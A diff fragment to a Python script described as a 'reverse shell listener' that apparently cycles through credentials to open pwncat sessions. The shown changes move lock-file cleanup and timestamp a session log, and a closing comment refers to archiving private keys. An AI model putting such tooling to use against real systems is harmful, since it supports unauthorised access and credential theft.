@@ -10,6 +10,7 @@ import argparse
 from pathlib import Path
 import time
 import requests
+from datetime import datetime, UTC
 
 parser = argparse.ArgumentParser(description='reverse shell listener')
 parser.add_argument('--user', dest='user', type=str,
@@ -340,10 +341,23 @@ try:
                 break  # Exit the user loop if a successful connection was made
         if success:
             break  # Exit the credential_type loop if a successful connection was made
+
 except Exception as e:
     print(f"exception: {e}")
-    if session_lock.exists():
-        session_lock.unlink()
+    pass
+
+print("Backup pwncat_connector.log...")
+pwncat_log = Path("/tmp/pwncat_connector.log")
+if pwncat_log.exists():
+    dest_log = Path(
+        f"/tmp/{datetime.now(UTC).strftime('%Y%m%d%H%M%S')}_pwncat_connector.log")
+    print(
+        f"Moving successful session log {pwncat_log.as_posix()} => {dest_log.as_posix()}")
+    pwncat_log.rename(dest_log)
+
+if session_lock.exists():
+    session_lock.unlink()
+
 exit(0)
 
 # archive all private keys
